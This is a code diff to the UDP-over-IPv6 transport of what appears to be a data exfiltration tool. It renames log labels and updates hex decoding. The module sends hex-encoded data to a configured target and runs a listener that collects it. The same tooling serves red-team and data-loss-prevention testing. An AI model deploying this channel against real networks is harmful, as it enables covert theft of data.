@@ -1,4 +1,4 @@
-from binascii import hexlify
+from binascii import hexlify, unhexlify
 import socket
 import sys
 from random import choice
@@ -17,14 +17,14 @@ def send(data):
         target = config['target']
     port = config['port']
     app_exfiltrate.log_message(
-        'info', "[tcp_ipv6] Sending {0} bytes to {1}".format(len(data), target))
+        'info', "[udp_ipv6] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
     client_socket.connect((target, port))
     client_socket.send(hexlify(data.encode()))
     client_socket.close()
 
 def listen():
-    app_exfiltrate.log_message('info', "[tcp_ipv6] Waiting for connections...")
+    app_exfiltrate.log_message('info', "[udp_ipv6] Waiting for connections...")
     sniff(handler=app_exfiltrate.retrieve_data)
 
 def sniff(handler):
@@ -38,21 +38,21 @@ def sniff(handler):
         sock.bind(sa)
         # sock.bind(server_address)
         app_exfiltrate.log_message(
-            'info', "[tcp_ipv6] Starting server on port {}...".format(port))
+            'info', "[udp_ipv6] Starting server on port {}...".format(port))
         # sock.listen(1)
     except Exception as e:
         app_exfiltrate.log_message(
-            'warning', "[tcp_ipv6] Couldn't bind on port {}...".format(port))
+            'warning', "[udp_ipv6] Couldn't bind on port {}...".format(port))
         sys.exit(-1)
 
     while True:
         data, client_address = sock.recvfrom(4096)
-        app_exfiltrate.log_message('info', "[tcp_ipv6] client connected: {}".format(client_address))
+        app_exfiltrate.log_message('info', "[udp_ipv6] client connected: {}".format(client_address))
         if not data:
             break
         try:
-            app_exfiltrate.log_message('info', "[tcp_ipv6] Received {} bytes".format(len(data)))
-            handler(data.decode('hex'))
+            app_exfiltrate.log_message('info', "[udp_ipv6] Received {} bytes".format(len(data)))
+            handler(unhexlify(data).decode())
         except Exception as e:
             pass
     sock.close()
